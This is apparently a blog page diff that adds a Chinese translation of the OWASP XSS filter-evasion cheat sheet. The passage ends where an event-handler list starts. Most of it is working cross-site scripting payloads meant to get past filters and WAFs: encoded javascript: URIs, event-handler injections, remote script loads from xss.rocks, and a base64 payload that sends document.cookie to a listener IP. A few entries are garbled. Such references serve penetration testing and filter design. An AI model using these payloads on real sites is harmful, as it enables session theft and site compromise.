@@ -138,6 +138,809 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
+                <a class="clearlink" href="15446891028198.html">
+                
+                  <h1>xss测试备忘录</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>description: 此备忘录来自：<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a><br/>
+列出了一系列可用于绕过某些XSS防御过滤器的XSS攻击。</p>
+</blockquote>
+
+<ul>
+<li><p>最基本的payload</p>
+<p><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;</code></p></li>
+<li><p>xss定位</p>
+<p>这个测试将在包含html、js、url、script string等多个上线文中执行</p>
+<p><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;/[]/+alert(1)//&#39;&gt;</code></p></li>
+<li><p>图像xss</p>
+<p><code>&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
+<li><p>没有引号和分号</p>
+<p><code>&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;</code></p></li>
+<li><p>不区分大小写</p>
+<p><code>&lt;IMG SRC=JaVaScRiPt:alert(&#39;XSS&#39;)&gt;</code></p></li>
+<li><p>html实体编码</p>
+<p><code>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</code></p></li>
+<li><p>重音符(esc下面tab上面那个符号)</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &#39;XSS&#39;&quot;)`&gt;
+</code></pre></li>
+<li><p>错误的a标签</p>
+<p><code>&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;</code></p>
+<p>chrome喜欢替换丢失的引号</p>
+<p><code>&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;</code></p></li>
+<li><p>错误的img标签</p>
+<p><code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</code></p></li>
+<li><p>fromCharCode()方法(根据Unicode值显示字符串)</p>
+<p><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code></p></li>
+<li><p>默认src标签，用于检查src过滤器</p>
+<p>这能绕过大多数src过滤器。在事件方法中插入javascript也适用于使用 form、iframe、input、embed等元素的任何htm标记类型注入，它还允许替换标记类型的任何相关事件，如onblur、onlick</p>
+<p><code>&lt;IMG SRC=# onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;</code></p></li>
+<li><p>将默认src留空</p>
+<p><code>&lt;IMG SRC= onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;</code></p></li>
+<li><p>完全不使用默认src</p>
+<p><code>&lt;IMG onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;</code></p></li>
+<li><p>出错时提示</p>
+<p><code>&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt;</code></p>
+<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
+<p>js编码</p>
+<p><code>&lt;img src=x onerror=&quot;&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&quot;&gt;</code></p></li>
+<li><p>十进制html字符引用</p>
+<p>所有在img标签中使用javascript代码的xss示例，在Gecko渲染引擎模式下都无法在Firefox或Netscape 8.1+ 中使用。</p>
+<pre class="line-numbers"><code class="language-markup">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
+&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+</code></pre>
+<p>变种(不带分号)</p>
+<p>通常在过滤 &#xxx; 的情况下有效</p>
+<p>过滤的写法——<code>$tmp_string =~ s/.*\&amp;#(\d+);.*/$1/;</code></p>
+<pre class="line-numbers"><code class="language-markup">&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;
+#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+</code></pre></li>
+<li><p>十六进制html字符引用，不带分号</p>
+<p><code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</code></p></li>
+<li><p>嵌入式标签</p>
+<p><code>&lt;IMG SRC=&quot;jav    ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
+<p>变种(编码)</p>
+<p>水平标签</p>
+<p><code>&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
+<p>换行符</p>
+<p><code>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
+<p>回车符</p>
+<p><code>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
+<li><p>null字符或者%00</p>
+<p>可以在终端使用以下代码生成 xss payload</p>
+<p><code>perl -e &#39;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#39; &gt; out</code></p>
+<p>如下：</p>
+<p><code>&lt;IMG SRC=java^@script:alert(&quot;XSS&quot;)&gt;</code></p></li>
+<li><p>空格和元字符在 javascript代码在图像中作为 xss payload之前</p>
+<p><code>&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
+<li><p>非字母非数字的xss</p>
+<p><code>&lt;SCRIPT/XSS SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code></p>
+<p>变种(Gecko渲染引擎允许在<em>事件处理程序和等号之间</em>使用除字母，数字或封装字符（如引号，尖括号等等）之外的任何字符)</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+</code></pre>
+<p>IE只允许标记和参数之间是不带空格的斜杠</p>
+<p><code>&lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code></p></li>
+<li><p>无关的开放式括号</p>
+<p>某些检测引擎会首先使用匹配的开启和关闭尖括号对，然后通过内部标记进行比较；双斜杠注释掉结束的无关括号以阻止javascript错误。</p>
+<p><code>&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT</code></p></li>
+<li><p>没有关闭脚本标签</p>
+<p><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;</code></p>
+<p>变种(半开html/javascript标签)</p>
+<p>半开的标签会扰乱html逻辑，影响payload后面的html，可以用来绕过NIDS正则表达式<code>/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/</code></p>
+<p><code>&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;</code></p>
+<p>变种(双开标签)</p>
+<p>firefox会受影响，netscape不会</p>
+<p><code>&lt;iframe src=http://xss.rocks/scriptlet.html &lt;</code></p></li>
+<li><p>javascript逃逸</p>
+<p>当输出javascript中的信息的代码这样写<code>&lt;SCRIPT&gt;var a=&quot;$ENV{QUERY_STRING}&quot;;&lt;/SCRIPT&gt;</code>并且想要将自己的javascript代码注入服务器端应用程序并逃脱某些引用时，可以通过逃避转移字符来规避它。当以下代码注入时，会被读取为<code>&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&#39;XSS&#39;);//&quot;;&lt;/SCRIPT&gt;</code></p>
+<p>拆开解读：</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;SCRIPT&gt;
+var a=&quot;\\&quot;;    合并前面的双引号<br/>
+alert(&#39;XSS&#39;);<br/>
+//&quot;;<br/>
+&lt;/SCRIPT&gt;    转义后面的双引号
+</code></pre>
+<p><code>\&quot;;alert(&#39;XSS&#39;);//</code></p>
+<p>另一种方法，如果嵌入的数据应用了对的json或javascript转义，而不是html编码，则</p>
+<p><code>&lt;/script&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></p></li>
+<li><p>html标签常规属性或方法</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;
+&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;<br/>
+&lt;BODY BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
+&lt;IMG DYNSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
+&lt;IMG LOWSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
+&lt;svg/onload=alert(&#39;XSS&#39;)&gt;<br/>
+&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;    这里还可以在等号后面加一个空格， (&quot;onload=&quot; 不等于 &quot;onload =&quot;)
+</code></pre></li>
+<li><p>img标签中使用VBscript</p>
+<pre class="line-numbers"><code class="language-&lt;img"></code></pre></li>
+<li><p>ECMAScript 6</p>
+<pre class="line-numbers"><code class="language-javascript">Set.constructor`alert \ x28document.domain \ x29
+</code></pre></li>
+<li><p>其他不常见的标签</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;BGSOUND SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;
+&lt;BR SIZE=&quot;&amp;{alert(&#39;XSS&#39;)}&quot;&gt;<br/>
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;    适用于IE<br/>
+&lt;STYLE&gt;@import&#39;http://xss.rocks/xss.css&#39;;&lt;/STYLE&gt;    用于google桌面，不能使用斜杠或等号的时候，这个payload很有用<br/>
+&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet&quot;&gt;<br/>
+&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://xss.rocks/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;    仅适用于Gecko渲染引擎<br/>
+&lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;;&lt;/STYLE&gt;    这个xss有时会将ie发送到无限循环的警报中<br/>
+&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))&quot;&gt;    由罗曼伊万诺夫创建<br/>
+exp/*&lt;A STYLE=&#39;no\xss:noxss(&quot;*//*&quot;);xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&#39;&gt;     混合表达式，可以将ie发送到无限循环中<br/>
+&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;  使用背景图像的style标签<br/>
+&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt;    使用背景的style标记<br/>
+&lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/IFRAME&gt;<br/>
+&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;<br/>
+&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/FRAMESET&gt;<br/>
+&lt;TABLE BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
+&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
+&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt;<br/>
+&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://xss.rocks/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;  这里可以注入病毒<br/>
+EMBED SRC=&quot;http://ha.ckers.Using EMBED标签你可以嵌入一个包含XSS的Flash电影。点击这里进行演示。如果添加属性 allowScriptAccess=&quot;never&quot; and allownetworking=&quot;internal&quot; 它可以减轻这种风险(感谢Jonathan Vanasco提供的信息).:<br/>
+org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;    可以嵌入flash影片<br/>
+&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;    这个仅适用于火狐<br/>
+a=&quot;get&quot;;<br/>
+b=&quot;URL(\&quot;&quot;;<br/>
+c=&quot;javascript:&quot;;<br/>
+d=&quot;alert(&#39;XSS&#39;);\&quot;)&quot;;<br/>
+eval(a+b+c+d);    <br/>
+可以使用actionscript模糊xss payload<br/>
+&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;<br/>
+&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;    适合IE<br/>
+&lt;XML SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;<br/>
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;<br/>
+&lt;HTML&gt;&lt;BODY&gt;<br/>
+&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;<br/>
+&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;<br/>
+&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;<br/>
+&lt;/BODY&gt;&lt;/HTML&gt;    仅在html和body标签之间才能工作<br/>
+&lt;SCRIPT SRC=&quot;http://xss.rocks/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;    可以将javascript文件重命名为xss payload 的图像<br/>
+&lt;!--#exec cmd=&quot;/bin/echo &#39;&lt;SCR&#39;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &#39;IPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;&#39;&quot;--&gt;    需要服务器安装ssl<br/>
+&lt;? echo(&#39;&lt;SCR)&#39;;<br/>
+echo(&#39;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;); ?&gt;    需要服务器安装php<br/>
+&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;<br/>
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser<br/>
+&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;&gt;    修改cookie<br/>
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&#39;XSS&#39;);+ADw-/SCRIPT+AD4-    utf-7编码，在google的404脚本中找到了这个漏洞
+</code></pre></li>
+<li><p>本地htc文件</p>
+<p><code>&lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&gt;</code></p></li>
+<li><p>US-ASCII编码</p>
+<p>US-ASCII编码（由Kurt Huwig发现）。这使用7位而不是8位的格式错误的ASCII编码。此XSS可能绕过许多内容过滤器，但仅在主机以US-ASCII编码传输时，或者如果您自己设置编码时才有效。这对于Web应用程序防火墙跨站点脚本规避而言比对服务器端过滤器规避更有用。Apache Tomcat是唯一以US-ASCII编码传输的已知服务器。</p>
+<p><code>¼script¾alert(¢XSS¢)¼/script¾</code></p></li>
+<li><p>META标签</p>
+<p>&lt;<em>meta</em>&gt; 元素可提供有关页面的元信息(<em>meta</em>-information),比如针对搜索引擎和更新频度的描述和关键词。</p>
+<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
+<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</code>        base64编码</p>
+<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
+<li><p>DIV标签</p>
+<p><code>&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</code></p>
+<ul>
+<li>具有单一编码xss漏洞的div背景图像</li>
+</ul>
+<p><code>&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&#39;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&#39;\0029&quot;&gt;</code></p>
+<ul>
+<li>包含十六禁止</li>
+</ul>
+<p><code>&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&#39;XSS&#39;))&quot;&gt;</code></p>
+<ul>
+<li>div表达式</li>
+</ul>
+<p><code>&lt;DIV STYLE=&quot;width: expression(alert(&#39;XSS&#39;));&quot;&gt;</code></p></li>
+<li><p>下层隐藏块(注释)</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;!--[if gte IE 4]&gt;
+&lt;SCRIPT&gt;alert(&#39;XSS&#39;);&lt;/SCRIPT&gt;<br/>
+&lt;![endif]--&gt;
+</code></pre></li>
+<li><p>使用html引用封装</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
+&lt;SCRIPT a=&quot;&gt;&quot; &#39;&#39; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
+&lt;SCRIPT &quot;a=&#39;&gt;&#39;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
+&lt;SCRIPT a=`&gt;` SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
+&lt;SCRIPT a=&quot;&gt;&#39;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+</code></pre></li>
+<li><p>url字符串规避</p>
+<p>ip或主机名<br/>
+<code>&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;</code></p>
+<p>url编码</p>
+<p><code>&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;</code></p>
+<p>双字节编码</p>
+<p><code>&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;</code></p>
+<p>十六进制编码</p>
+<p><code>&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;</code></p>
+<p>八进制编码</p>
+<p><code>&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;</code></p>
+<p>base64编码</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;img onload=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=&#39;))&quot;&gt;
+</code></pre>
+<p>混合编码</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;A HREF=&quot;h
+tt    p://6   6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
+</code></pre></li>
+<li><p>协议解析绕过</p>
+<pre class="line-numbers"><code class="language-text">&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;javascript:document.location=&#39;http://www.google.com/&#39;&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;http://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
+</code></pre></li>
+</ul>
+
+<h2 id="toc_0">字符串转义序列</h2>
+
+<p>HTML和JavaScript中字符“&lt;”的所有可能组合。其中大部分都不会开箱即用，但如上所述，其中许多都可以在某些情况下渲染。</p>
+
+<pre class="line-numbers"><code class="language-text">&lt;
+%3C
+&amp;lt
+&amp;lt;
+&amp;LT
+&amp;LT;
+&amp;#60
+&amp;#060
+&amp;#0060
+&amp;#00060
+&amp;#000060
+&amp;#0000060
+&amp;#60;
+&amp;#060;
+&amp;#0060;
+&amp;#00060;
+&amp;#000060;
+&amp;#0000060;
+&amp;#x3c
+&amp;#x03c
+&amp;#x003c
+&amp;#x0003c
+&amp;#x00003c
+&amp;#x000003c
+&amp;#x3c;
+&amp;#x03c;
+&amp;#x003c;
+&amp;#x0003c;
+&amp;#x00003c;
+&amp;#x000003c;
+&amp;#X3c
+&amp;#X03c
+&amp;#X003c
+&amp;#X0003c
+&amp;#X00003c
+&amp;#X000003c
+&amp;#X3c;
+&amp;#X03c;
+&amp;#X003c;
+&amp;#X0003c;
+&amp;#X00003c;
+&amp;#X000003c;
+&amp;#x3C
+&amp;#x03C
+&amp;#x003C
+&amp;#x0003C
+&amp;#x00003C
+&amp;#x000003C
+&amp;#x3C;
+&amp;#x03C;
+&amp;#x003C;
+&amp;#x0003C;
+&amp;#x00003C;
+&amp;#x000003C;
+&amp;#X3C
+&amp;#X03C
+&amp;#X003C
+&amp;#X0003C
+&amp;#X00003C
+&amp;#X000003C
+&amp;#X3C;
+&amp;#X03C;
+&amp;#X003C;
+&amp;#X0003C;
+&amp;#X00003C;
+&amp;#X000003C;
+\x3c
+\x3C
+\u003c
+\u003C
+</code></pre>
+
+<h2 id="toc_1">绕过waf的方法</h2>
+
+<ul>
+<li><p>存储型xss</p>
+<p>如果攻击者设法通过过滤器过滤xss，则waf无法阻止攻击传导</p></li>
+<li><p>发射型xss</p>
+<pre class="line-numbers"><code class="language-text">示例: &lt;script&gt; ... setTimeout(\&quot;writetitle()\&quot;,$_GET[xss]) ... &lt;/script&gt;
+利用: /?xss=500); alert(document.cookie);//
+</code></pre></li>
+<li><p>dom型xss</p>
+<pre class="line-numbers"><code class="language-text">示例: &lt;script&gt; ... eval($_GET[xss]); ... &lt;/script&gt;
+利用: /?xss=document.cookie
+</code></pre></li>
+<li><p>xss通过请求重定向</p>
+<p>易受攻击的代码</p>
+<pre class="line-numbers"><code class="language-text">...
+header(&#39;Location: &#39;.$_GET[&#39;param&#39;]);<br/>
+...<br/>
+以及<br/>
+...<br/>
+header(&#39;Refresh: 0; URL=&#39;.$_GET[&#39;param&#39;]);<br/>
+...
+</code></pre>
+<p>此请求不会通过waf：</p>
+<p><code>/?param=javascript:alert(document.cookie)</code></p>
+<p>此请求将通过waf，并且将在某些浏览器中执行</p>
+<p><code>/?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=</code></p></li>
+<li><p>用户xss的 waf bypass 字符串</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;Img src = x onerror = &quot;javascript: window.onerror = alert; throw XSS&quot;&gt;
+&lt;Video&gt; &lt;source onerror = &quot;javascript: alert (XSS)&quot;&gt;<br/>
+&lt;Input value = &quot;XSS&quot; type = text&gt;<br/>
+&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt;<br/>
+&lt;isindex x=&quot;javascript:&quot; onmouseover=&quot;alert(XSS)&quot;&gt;<br/>
+&quot;&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;<br/>
+&quot;&gt;&lt;img src=&quot;x:x&quot; onerror=&quot;alert(XSS)&quot;&gt;<br/>
+&quot;&gt;&lt;iframe src=&quot;javascript:alert(XSS)&quot;&gt;<br/>
+&lt;object data=&quot;javascript:alert(XSS)&quot;&gt;<br/>
+&lt;isindex type=image src=1 onerror=alert(XSS)&gt;<br/>
+&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;<br/>
+&lt;img  src=&quot;x:gif&quot; onerror=&quot;window[&#39;al\u0065rt&#39;](0)&quot;&gt;&lt;/img&gt;<br/>
+&lt;iframe/src=&quot;data:text/html,&lt;svg onload=alert(1)&gt;&quot;&gt;<br/>
+&lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;<br/>
+&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open(&#39;https://www.google.com/&#39;)&gt;&lt;/script<br/>
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&gt;<br/>
+&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;<br/>
+&lt;form&gt;&lt;a href=&quot;javascript:\u0061lert(1)&quot;&gt;X<br/>
+&lt;/script&gt;&lt;img/*%00/src=&quot;worksinchrome&amp;colon;prompt(1)&quot;/%00*/onerror=&#39;eval(src)&#39;&gt;<br/>
+&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt; <br/>
+鼠标悬停在上面<br/>
+&lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror=&#39;prompt(1)&#39;&quot;&gt;<br/>
+&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;ClickMe<br/>
+&lt;script x&gt; alert(1) &lt;/script 1=2<br/>
+&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME<br/>
+&lt;input/onmouseover=&quot;javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;&quot;<br/>
+&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;
+</code></pre></li>
+<li><p>过滤旁路警报混淆</p>
+<pre class="line-numbers"><code class="language-text">(alert)(1)
+a=alert,a(1)<br/>
+[1].find(alert)<br/>
+top[“al”+”ert”](1)<br/>
+top[/al/.source+/ert/.source](1)<br/>
+al\u0065rt(1)<br/>
+top[‘al\145rt’](1)<br/>
+top[‘al\x65rt’](1)<br/>
+top[8680439..toString(30)](1)
+</code></pre></li>
+</ul>
+
+<h2 id="toc_2">事件处理程序</h2>
+
+<p>可以参考dottoro的网站<a href="http://help.dottoro.com/ljfvvdnm.php">javascript事件列表</a></p>
+
+<ol>
